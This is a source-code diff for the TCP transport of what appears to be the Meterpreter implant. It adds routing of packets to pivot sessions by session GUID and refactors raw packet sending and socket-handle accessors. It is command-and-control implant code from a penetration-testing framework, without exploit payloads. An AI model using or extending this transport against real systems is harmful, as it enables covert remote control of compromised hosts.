@@ -5,11 +5,12 @@
 #include "../../common/common.h"
 #include <ws2tcpip.h>
 #include "../../common/packet_encryption.h"
+#include "../../common/pivot_packet_dispatch.h"
 
 // TCP-transport specific migration stub.
 typedef struct _TCPMIGRATECONTEXT
 {
-	COMMONMIGRATCONTEXT common;
+	COMMONMIGRATECONTEXT common;
 	WSAPROTOCOL_INFOA info;
 } TCPMIGRATECONTEXT, * LPTCPMIGRATECONTEXT;
 
@@ -273,51 +274,6 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 }
 
 /*!
- * @brief Flush all pending data on the connected socket
- * @param remote Pointer to the remote instance.
- */
-static VOID server_socket_flush(Transport* transport)
-{
-	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
-	fd_set fdread;
-	DWORD ret;
-	char buff[4096];
-
-	lock_acquire(transport->lock);
-
-	while (1)
-	{
-		struct timeval tv;
-		LONG data;
-
-		FD_ZERO(&fdread);
-		FD_SET(ctx->fd, &fdread);
-
-		// Wait for up to one second for any errant socket data to appear
-		tv.tv_sec = 1;
-		tv.tv_usec = 0;
-
-		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
-		if (data == 0)
-		{
-			break;
-		}
-
-		ret = recv(ctx->fd, buff, sizeof(buff), 0);
-		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);
-
-		// The socket closed while we waited
-		if (ret <= 0)
-		{
-			break;
-		}
-		continue;
-	}
-
-	lock_release(transport->lock);
-}
-
-/*!
  * @brief Poll a socket for data to recv and block when none available.
  * @param remote Pointer to the remote instance.
  * @param timeout Amount of time to wait before the poll times out (in milliseconds).
@@ -359,7 +315,6 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 	LONG bytesRead;
 	BOOL inHeader = TRUE;
 	PUCHAR packetBuffer = NULL;
-	PUCHAR payload = NULL;
 	ULONG payloadLength;
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 
@@ -449,6 +404,8 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 		else
 		{
 			vdprintf("[TCP] XOR key looks fine, moving on");
+			PacketHeader encodedHeader;
+			memcpy(&encodedHeader, &header, sizeof(PacketHeader));
 			// xor the header data
 			xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
 #ifdef DEBUGTRACE
@@ -456,7 +413,6 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 			vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
 				h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
 #endif
-			
 			payloadLength = ntohl(header.length) - sizeof(TlvHeader);
 			vdprintf("[TCP] Payload length is %d", payloadLength);
 			DWORD packetSize = sizeof(PacketHeader) + payloadLength;
@@ -472,13 +428,10 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 			}
 			dprintf("[TCP] Allocated packet buffer at %p", packetBuffer);
 
-			// we're done with the header data, so we need to re-encode it, as the packet decryptor is going to
-			// handle the extraction for us.
-			xor_bytes(header.xor_key, (LPBYTE)&header.session_guid[0], sizeof(PacketHeader) - sizeof(header.xor_key));
 			// Copy the packet header stuff over to the packet
-			memcpy_s(packetBuffer, sizeof(PacketHeader), (LPBYTE)&header, sizeof(PacketHeader));
+			memcpy_s(packetBuffer, sizeof(PacketHeader), (LPBYTE)&encodedHeader, sizeof(PacketHeader));
 
-			payload = packetBuffer + sizeof(PacketHeader);
+			LPBYTE payload = packetBuffer + sizeof(PacketHeader);
 
 			// Read the payload
 			while (payloadBytesLeft > 0)
@@ -509,30 +462,51 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 				break;
 			}
 
-			vdprintf("[TCP] decrypting packet");
-			SetLastError(decrypt_packet(remote, packet, packetBuffer, packetSize));
+#ifdef DEBUGTRACE
+			h = (PUCHAR)&header.session_guid[0];
+			dprintf("[TCP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
+				h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
+#endif
+			if (is_null_guid(header.session_guid) || memcmp(remote->orig_config->session.session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
+			{
+				dprintf("[TCP] Session GUIDs match (or packet guid is null), decrypting packet");
+				SetLastError(decrypt_packet(remote, packet, packetBuffer, packetSize));
+			}
+			else
+			{
+				dprintf("[TCP] Session GUIDs don't match, looking for a pivot");
+				PivotContext* pivotCtx = pivot_tree_find(remote->pivot_sessions, header.session_guid);
+				if (pivotCtx != NULL)
+				{
+					dprintf("[TCP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)");
+					SetLastError(pivot_packet_dispatch(pivotCtx, packetBuffer, packetSize));
 
-			free(packetBuffer);
+					// mark this packet buffer as NULL as the thread will clean it up
+					packetBuffer = NULL;
+					*packet = NULL;
+				}
+				else
+				{
+					dprintf("[TCP] Session GUIDs don't match, can't find pivot!");
+				}
+			}
 		}
 
 	} while (0);
 
 	res = GetLastError();
 
+	dprintf("[TCP] Freeing stuff up");
+	SAFE_FREE(packetBuffer);
+
 	// Cleanup on failure
 	if (res != ERROR_SUCCESS)
 	{
-		if (payload)
-		{
-			free(payload);
-		}
-		if (localPacket)
-		{
-			free(localPacket);
-		}
+		SAFE_FREE(localPacket);
 	}
 
 	lock_release(remote->lock);
+	dprintf("[TCP] Packet receive finished");
 
 	return res;
 }
@@ -619,14 +593,27 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
  * @param transport Pointer to the TCP transport containing the socket.
  * @return The current transport socket FD, if any, or zero.
  */
-static SOCKET transport_get_socket_tcp(Transport* transport)
+static UINT_PTR transport_get_handle_tcp(Transport* transport)
 {
 	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
-		return ((TcpTransportContext*)transport->ctx)->fd;
+		return (UINT_PTR)((TcpTransportContext*)transport->ctx)->fd;
 	}
 
 	return 0;
+}
+
+/*!
+ * @brief Set the socket from the transport (if it's TCP).
+ * @param transport Pointer to the TCP transport containing the socket.
+ * @param handle The current transport socket FD, if any.
+ */
+static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle)
+{
+	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
+	{
+		((TcpTransportContext*)transport->ctx)->fd = (SOCKET)handle;
+	}
 }
 
 /*!
@@ -792,95 +779,47 @@ static BOOL configure_tcp_connection(Transport* transport)
 }
 
 /*!
- * @brief Transmit a packet via TCP _and_ destroy it.
+ * @brief Transmit a packet via TCP.
  * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to the \c Packet that is to be sent.
- * @param completion Pointer to the completion routines to process.
+ * @param rawPacket Pointer to the raw packet bytes to send.
+ * @param rawPacketLength Length of the raw packet data.
  * @return An indication of the result of processing the transmission request.
- * @remark This uses a TCP channel.
  */
-DWORD packet_transmit(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
+DWORD packet_transmit_tcp(Remote* remote, LPBYTE rawPacket, DWORD rawPacketLength)
 {
-	Tlv requestId;
-	DWORD res;
-	DWORD idx;
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
-	BYTE* encryptedPacket = NULL;
-	DWORD encryptedPacketLength = 0;
-
-	dprintf("[TRANSMIT] Sending packet to the server");
+	DWORD result = ERROR_SUCCESS;
+	DWORD idx = 0;
 
 	lock_acquire(remote->lock);
 
-	// If the packet does not already have a request identifier, create one for it
-	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
+	while (idx < rawPacketLength)
 	{
-		DWORD index;
-		CHAR rid[32];
+		result = send(ctx->fd, rawPacket + idx, rawPacketLength - idx, 0);
 
-		rid[sizeof(rid)-1] = 0;
-
-		for (index = 0; index < sizeof(rid)-1; index++)
+		if (result < 0)
 		{
-			rid[index] = (rand() % 0x5e) + 0x21;
-		}
-
-		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
-	}
-
-	// Always add the UUID to the packet as well, so that MSF knows who and what we are
-  	packet_add_tlv_raw(packet, TLV_TYPE_UUID, remote->orig_config->session.uuid, UUID_SIZE);
-
-	do
-	{
-		// If a completion routine was supplied and the packet has a request
-		// identifier, insert the completion routine into the list
-		if ((completion) &&
-			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
-			&requestId) == ERROR_SUCCESS))
-		{
-			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
-		}
-
-		encrypt_packet(remote, packet, &encryptedPacket, &encryptedPacketLength);
-		dprintf("[PACKET] Sending packet to remote, length: %u", encryptedPacketLength);
-
-		idx = 0;
-		while (idx < encryptedPacketLength)
-		{
-			res = send(ctx->fd, encryptedPacket + idx, encryptedPacketLength - idx, 0);
-
-			if (res < 0)
-			{
-				break;
-			}
-
-			idx += res;
-		}
-
-		if (res < 0)
-		{
-			dprintf("[PACKET] transmit packet failed with return %d at index %d\n", res, idx);
+			dprintf("[PACKET] send failed: %d", result);
 			break;
 		}
 
-		dprintf("[PACKET] Packet sent!");
-		SetLastError(ERROR_SUCCESS);
-	} while (0);
-
-	res = GetLastError();
-
-	if (encryptedPacket != NULL)
-	{
-		free(encryptedPacket);
+		idx += result;
 	}
 
-	// Destroy the packet
-	packet_destroy(packet);
+	result = GetLastError();
+
+	if (result != ERROR_SUCCESS)
+	{
+		dprintf("[PACKET] transmit packet failed with return %d at index %d\n", result, idx);
+	}
+	else
+	{
+		dprintf("[PACKET] Packet sent!");
+	}
 
 	lock_release(remote->lock);
 
-	return res;
+	return result;
 }
 
 /*!
@@ -950,12 +889,13 @@ Transport* transport_create_tcp(MetsrvTransportTcp* config)
 	transport->timeouts.retry_total = config->common.retry_total;
 	transport->timeouts.retry_wait = config->common.retry_wait;
 	transport->url = _wcsdup(config->common.url);
-	transport->packet_transmit = packet_transmit;
+	transport->packet_transmit = packet_transmit_tcp;
 	transport->transport_init = configure_tcp_connection;
 	transport->transport_destroy = transport_destroy_tcp;
 	transport->transport_reset = transport_reset_tcp;
 	transport->server_dispatch = server_dispatch_tcp;
-	transport->get_socket = transport_get_socket_tcp;
+	transport->get_handle = transport_get_handle_tcp;
+	transport->set_handle = transport_set_handle_tcp;
 	transport->ctx = ctx;
 	transport->comms_last_packet = current_unix_timestamp();
 	transport->get_migrate_context = get_migrate_context_tcp;
